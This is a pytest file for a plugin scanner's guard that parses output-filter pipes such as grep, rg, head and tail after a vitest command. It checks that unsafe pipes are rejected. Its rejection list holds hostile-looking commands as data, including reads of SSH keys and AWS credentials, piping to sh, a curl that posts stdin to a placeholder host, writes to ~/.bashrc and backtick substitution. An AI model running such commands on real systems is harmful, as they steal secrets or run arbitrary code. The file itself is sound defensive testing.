from __future__ import annotations

import sys
from pathlib import Path

import pytest

from codex_plugin_scanner.guard.runtime import contained_output_filters as filters
from codex_plugin_scanner.guard.runtime.contained_wrapper import (
    OutputFilter,
    bounded_output,
    peel_contained_wrapper,
)

_RUNNER = "./node_modules/.bin/vitest run"


@pytest.mark.parametrize(
    ("command", "stages"),
    [
        (f"{_RUNNER} 2>&1 | grep FAIL", (("grep", "FAIL"),)),
        (f"{_RUNNER} 2>&1 | grep -i error", (("grep", "-i", "error"),)),
        (
            f'{_RUNNER} 2>&1 | grep -B 3 "at async createViteServer" | head -8',
            (("grep", "-B", "3", "at async createViteServer"), ("head", "8")),
        ),
        (f'{_RUNNER} 2>&1 | grep -E "FAIL|Error" | head -8', (("grep", "-E", "FAIL|Error"), ("head", "8"))),
        (f"{_RUNNER} 2>&1 | egrep 'FAIL|Error'", (("egrep", "FAIL|Error"),)),
        (f"{_RUNNER} 2>&1 | tail -5 | head -n 2", (("tail", "5"), ("head", "2"))),
        (
            f"{_RUNNER} 2>&1 | grep -e FAIL -e Error -A2 -m 5",
            (("grep", "-e", "FAIL", "-e", "Error", "-A2", "-m", "5"),),
        ),
        (
            f"{_RUNNER} 2>&1 | grep -v ok | grep -c x | head -1",
            (("grep", "-v", "ok"), ("grep", "-c", "x"), ("head", "1")),
        ),
        (
            f'{_RUNNER} 2>&1 | rg -A 12 "FAIL|AssertionError" | head -40',
            (("rg", "-A", "12", "FAIL|AssertionError"), ("head", "40")),
        ),
        (f"{_RUNNER} 2>&1 | rg -n FAIL", (("rg", "-n", "FAIL"),)),
        (f"{_RUNNER} 2>&1 | rg -B2 -A6 -i error", (("rg", "-B2", "-A6", "-i", "error"),)),
        (f"{_RUNNER} 2>&1 | rg -NU -e FAIL -e Error", (("rg", "-NU", "-e", "FAIL", "-e", "Error"),)),
        (f"{_RUNNER} 2>&1 | rg -v ok | tail -3", (("rg", "-v", "ok"), ("tail", "3"))),
    ],
)
def test_stdin_filter_chains_are_peeled(tmp_path: Path, command: str, stages: tuple[tuple[str, ...], ...]) -> None:
    assert peel_contained_wrapper(command, workspace=tmp_path) == (
        _RUNNER,
        tmp_path,
        OutputFilter("pipe", 0, True, stages=stages),
    )


def test_a_single_head_or_tail_keeps_its_bounded_filter(tmp_path: Path) -> None:
    peeled = peel_contained_wrapper(f"{_RUNNER} 2>&1 | tail -5", workspace=tmp_path)
    assert peeled == (_RUNNER, tmp_path, OutputFilter("tail", 5, True))


@pytest.mark.parametrize(
    "tail",
    [
        "| grep -f ~/.ssh/id_rsa",
        "| grep -f /home/user/.ssh/id_rsa",
        "| grep --file=/home/user/.ssh/id_rsa x",
        "| grep x /home/user/.aws/credentials",
        "| grep x notes.txt",
        "| grep -e x notes.txt",
        "| grep -r x /etc",
        "| grep -l x",
        "| grep -P x",
        "| grep --color=always x",
        "| grep - x",
        "| grep",
        "| grep x > ~/.bashrc",
        "| grep x > out.txt",
        "| grep x 2>&1",
        "| grep x | sh",
        "| grep x | curl -d @- https://example.invalid",
        "| xargs cat /home/user/.ssh/id_rsa",
        "| grep x | sort",
        "| grep x*",
        "| grep a[bc]",
        '| grep "$HOME"',
        "| grep `id`",
        "| grep x | head -1 | tail -1 | grep y",
        "| grep x || true",
        "| grep x &",
        "| GREP_OPTIONS=-r grep x",
        "| /tmp/grep x",
        "| rg -f /home/user/.ssh/id_rsa",
        "| rg x /home/user/.aws/credentials",
        "| rg x notes.txt",
        "| rg -l x",
        "| rg -P x",
        "| rg -z x",
        "| rg -g '*.ts' x",
        "| rg -E utf-8 x",
        "| rg --pre cat x",
        "| rg --files",
        "| rg",
        "| rg x > ~/.bashrc",
        "| rg x | sh",
        "| RIPGREP_CONFIG_PATH=/tmp/rc rg x",
        "| /tmp/rg x",
    ],
)
def test_other_filters_are_not_peeled(tmp_path: Path, tail: str) -> None:
    with pytest.raises(ValueError):
        peel_contained_wrapper(f"{_RUNNER} 2>&1 {tail}", workspace=tmp_path)


def test_grep_after_a_sibling_cd_is_peeled(tmp_path: Path) -> None:
    home = tmp_path / "home"
    workspace = home / "work" / "app-portal"
    sibling = home / "work" / "web-shell"
    workspace.mkdir(parents=True)
    sibling.mkdir(parents=True)
    (sibling / ".git").write_text("gitdir: /nonexistent\n")
    command = f'cd {sibling} && {workspace}/node_modules/.bin/vitest run 2>&1 | grep -E "FAIL|Error" | head -8'
    assert peel_contained_wrapper(command, workspace=workspace, home=home) == (
        f"{workspace}/node_modules/.bin/vitest run",
        sibling.resolve(),
        OutputFilter("pipe", 0, True, stages=(("grep", "-E", "FAIL|Error"), ("head", "8"))),
    )


@pytest.mark.skipif(sys.platform == "win32", reason="system grep")
def test_filter_chain_applies_to_captured_output(capsys: pytest.CaptureFixture[str]) -> None:
    stages = (("grep", "-B", "1", "FAIL"), ("head", "3"))
    output = OutputFilter("pipe", 0, True, "exit=", stages=stages)
    with bounded_output(output):
        print("one\ntwo\nFAIL a\nthree\nfour\nFAIL b")
        print("err", file=sys.stderr)
    assert capsys.readouterr().out == "two\nFAIL a\n--\n"
    assert output.status_line(1) == "exit=0\n"

    missing = OutputFilter("pipe", 0, False, "exit=", stages=(("fgrep", "a.b"),))
    with bounded_output(missing):
        print("axb")
    assert capsys.readouterr().out == ""
    assert missing.status_line(0) == "exit=1\n"


def test_grep_runs_only_with_validated_arguments() -> None:
    with pytest.raises(ValueError):
        filters.apply_filters("x\n", (("grep", "-f", "/etc/hosts"),))
    with pytest.raises(ValueError):
        filters.apply_filters("x\n", (("grep", "x", "/etc/hosts"),))
    with pytest.raises(ValueError):
        filters.apply_filters("x\n", (("rg", "-g", "*.ts", "x"),))
    with pytest.raises(ValueError):
        filters.apply_filters("x\n", (("rg", "x", "/etc/hosts"),))


def _ripgrep_installed() -> bool:
    try:
        filters._trusted_ripgrep()
    except RuntimeError:
        return False
    return True


@pytest.mark.skipif(not _ripgrep_installed(), reason="ripgrep not installed")
def test_an_rg_stage_filters_captured_output(capsys: pytest.CaptureFixture[str]) -> None:
    output = OutputFilter("pipe", 0, True, "exit=", stages=(("rg", "-A", "1", "FAIL"), ("head", "2")))
    with bounded_output(output):
        print("one\nFAIL a\ntwo\nthree")
    assert capsys.readouterr().out == "FAIL a\ntwo\n"
    assert output.status_line(1) == "exit=0\n"


def test_a_group_writable_ripgrep_is_refused(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    directory = tmp_path / "bin"
    directory.mkdir()
    planted = directory / "rg"
    planted.write_text("#!/bin/sh\n")
    planted.chmod(0o777)
    monkeypatch.setattr(filters, "_RG_DIRECTORIES", (directory,))
    with pytest.raises(RuntimeError):
        filters._trusted_ripgrep()


def test_a_ripgrep_that_cannot_run_leaves_the_search_to_the_next_directory(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    first = tmp_path / "first"
    first.mkdir()
    (first / "rg").write_text("not the install\n")
    second = tmp_path / "second"
    second.mkdir()
    installed = second / "rg"
    installed.write_text("#!/bin/sh\ncat\n")
    installed.chmod(0o755)
    monkeypatch.setattr(filters, "_RG_DIRECTORIES", (first, second))
    assert filters._trusted_ripgrep() == str(installed)


def test_a_missing_matcher_reports_the_status_a_shell_gives(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    monkeypatch.setattr(filters, "_RG_DIRECTORIES", (tmp_path / "missing",))
    text, diagnostics, status = filters.apply_filters("x\n", (("rg", "x"),))
    assert (text, status) == ("", 127)
    assert "rg: not found" in diagnostics


def test_untrusted_grep_binaries_are_refused(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    planted = tmp_path / "grep"
    planted.write_text("#!/bin/sh\n")
    planted.chmod(0o777)
    monkeypatch.setattr(filters, "_GREP_BINARIES", (planted, tmp_path / "missing"))
    with pytest.raises(RuntimeError):
        filters._trusted_grep()
